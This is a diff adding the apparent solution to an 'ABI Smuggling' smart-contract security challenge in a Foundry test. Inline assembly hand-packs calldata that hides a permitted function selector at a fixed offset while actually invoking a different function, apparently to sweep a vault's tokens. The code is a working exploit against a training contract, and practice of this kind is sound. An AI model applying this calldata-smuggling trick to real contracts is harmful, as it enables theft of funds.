@@ -74,6 +74,27 @@ contract ABISmugglingChallenge is Test {
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
         
+        address vaultAddr = address(vault);
+        address tokenAddr = address(token);
+        address recoveryAddr = recovery;
+        assembly {
+            let p := mload(0x40)
+            mstore(p, shl(224, 0x1cff79cd))
+            mstore(add(p, 0x04), vaultAddr)
+            mstore(add(p, 0x24), 0x80)
+            mstore(add(p, 0x44), 0x00)
+            mstore(add(p, 0x64), shl(224, 0xd9caed12))
+            mstore(add(p, 0x84), 0x44)
+            mstore(add(p, 0xa4), shl(224, 0x85fb709d))
+            mstore(add(p, 0xa8), recoveryAddr)
+            mstore(add(p, 0xc8), tokenAddr)    
+            let success:= call(gas(), vaultAddr, 0, p, 232, 0, 0)
+            if iszero(success) {
+                mstore(0x00, shl(224, 0x6c9d47e8)) // CallError()
+                revert(0, 4)
+            } 
+        
+        }
     }
 
     /**
